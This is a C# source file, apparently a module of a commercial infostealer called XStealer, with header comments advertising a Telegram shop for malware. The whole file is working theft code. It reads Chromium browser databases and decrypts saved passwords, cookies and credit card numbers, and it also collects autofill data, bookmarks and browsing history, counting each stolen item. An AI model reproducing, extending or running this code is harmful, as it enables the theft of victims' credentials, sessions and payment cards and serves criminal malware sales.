// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Text;
    using System.Text.RegularExpressions;
    using Helpers;

    public static class CDataStruct
    {
        #region Table Sqlite | Таблицы Sqlite
        const string TABLE_LOGINS = "logins",
                     TABLE_COOKIES = "cookies",
                     TABLE_CREDITS = "credit_cards",
                     TABLE_AUTOFILL = "autofill",
                     URL = "origin_url",
                     USERNAME = "username_value",
                     PASS = "password_value";
        #endregion

        #region Retrieving Information from SQLite Databases | Получение информации из базы данных SQLite
        public static List<Structures.Cookie_Chromium> ReadDataCookies(string sCookie)
        {
            var lcCookies = new List<Structures.Cookie_Chromium>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(sCookie, TABLE_COOKIES);
                if (sSQLite == null) return lcCookies;
                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    var cCookie = new Structures.Cookie_Chromium();
                    cCookie.C_Value = cCookie.C_Value != "" ? DecoderEx.DecryptEx(sCookie, sSQLite.GetValue(i, 12)) : sSQLite.GetValue(i, 3);
                    cCookie.C_HostKey = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 1));
                    cCookie.C_Name = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 2));
                    cCookie.C_Path = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 4));
                    cCookie.C_ExpiresUtc = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 5));
                    cCookie.C_IsSecure = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 6).ToUpper());
                    CounterEx.Cookies++;
                    lcCookies.Add(cCookie);
                }
            }
            catch (Exception) { }
            return lcCookies;
        }
        public static List<Structures.Password_Chromium> ReadDataLogins(string sLoginData, string browname)
        {
            var pPasswords = new List<Structures.Password_Chromium>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(sLoginData, TABLE_LOGINS);
                if (sSQLite == null) return pPasswords;
                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string sPassword = sSQLite.GetValue(i, PASS); // PASS | "password_value" | 5
                    string Url = ConverterEx.StringToUTF8(sSQLite.GetValue(i, URL)); // URL | "origin_url" | 0
                    string Username = ConverterEx.StringToUTF8(sSQLite.GetValue(i, USERNAME)); // USERNAME | "username_value" | 3
                    string DecryptPass = ConverterEx.StringToUTF8(DecoderEx.DecryptEx(sLoginData, sPassword));

                    if (!string.IsNullOrWhiteSpace(Url) || !string.IsNullOrWhiteSpace(Username) || (!string.IsNullOrWhiteSpace(sPassword)))
                    {
                        var list = new Structures.Password_Chromium
                        {
                            C_Url = Url,
                            C_Username = Username,
                            C_Pass = DecryptPass,
                            C_BrowserName = browname
                        };
                        CounterEx.Passwords++;
                        pPasswords.Add(list);
                    }

                    continue;
                }
            }
            catch (Exception) { }

            return pPasswords;
        }
        public static List<Structures.CreditCard_Chromium> ReadDataCredits(string sWebData)
        {
            var lcCC = new List<Structures.CreditCard_Chromium>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(sWebData, TABLE_CREDITS);
                if (sSQLite == null) return lcCC;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    var cCard = new Structures.CreditCard_Chromium
                    {
                        C_Number = ConverterEx.StringToUTF8(DecoderEx.DecryptEx(sWebData, sSQLite.GetValue(i, 4))),
                        C_ExpYear = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 3)),
                        C_ExpMonth = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 2)),
                        C_Name = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 1))
                    };
                    CounterEx.CreditCards++;
                    lcCC.Add(cCard);
                }
            }
            catch (Exception) { }
            return lcCC;
        }
        public static List<Structures.Bookmark_Chromium> ReadDataBookmarks(string sBookmarks)
        {
            var bBookmarks = new List<Structures.Bookmark_Chromium>();
            if (!File.Exists(sBookmarks)) { return bBookmarks; }
            try
            {
                string data = File.ReadAllText(sBookmarks, Encoding.UTF8);
                data = Regex.Split(data, "      \"bookmark_bar\": {")[1];
                data = Regex.Split(data, "      \"other\": {")[0];
                string[] payload = Regex.Split(data, "},");
                foreach (string parse in payload.Where(parse => parse.Contains("\"name\": \"") && parse.Contains("\"type\": \"url\",") && parse.Contains("\"url\": \"http")))
                {
                    int index = 0;
                    foreach (string target in Regex.Split(parse, ParserBook.separator))
                    {
                        index++;
                        if (ParserBook.DetectTitle(target))
                        {
                            var bBookmark = new Structures.Bookmark_Chromium
                            {
                                C_Title = ParserBook.Get(parse, index),
                                C_Url = ParserBook.Get(parse, index + 2)
                            };

                            if (!string.IsNullOrEmpty(bBookmark.C_Title) && !string.IsNullOrEmpty(bBookmark.C_Url) && !bBookmark.C_Url.Contains("Failed to parse url"))
                            {
                                CounterEx.Bookmarks++;
                                bBookmarks.Add(bBookmark);

                            }
                        }
                    }
                }
            }
            catch (Exception) { }
            return bBookmarks;
        }
        public static List<Structures.AutoFill_Chromium> ReadDataAutoFill(string sWebData)
        {
            var acAutoFillData = new List<Structures.AutoFill_Chromium>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(sWebData, TABLE_AUTOFILL);
                if (sSQLite == null) return acAutoFillData;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    var aFill = new Structures.AutoFill_Chromium
                    {
                        C_Name = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 0)),
                        C_Value = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 1))
                    };
                    CounterEx.AutoFill++;
                    acAutoFillData.Add(aFill);
                }
            }
            catch (Exception) { }
            return acAutoFillData;
        }
        public static List<Structures.History_Chromium> ReadDataHistory(string sHistory)
        {
            var scHistory = new List<Structures.History_Chromium>();
            try
            {
                var sSQLite = new SqliteEx().ReadTableFromTemp(sHistory, "urls");
                if (sSQLite == null) return scHistory;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    var sSite = new Structures.History_Chromium
                    {
                        C_Title = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 1)),
                        C_Url = ConverterEx.StringToUTF8(sSQLite.GetValue(i, 2)),
                        C_Count = Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1
                    };
                    CounterEx.History++;
                    scHistory.Add(sSite);
                }
            }
            catch (Exception) { }
            return scHistory;
        }
        #endregion
    }
}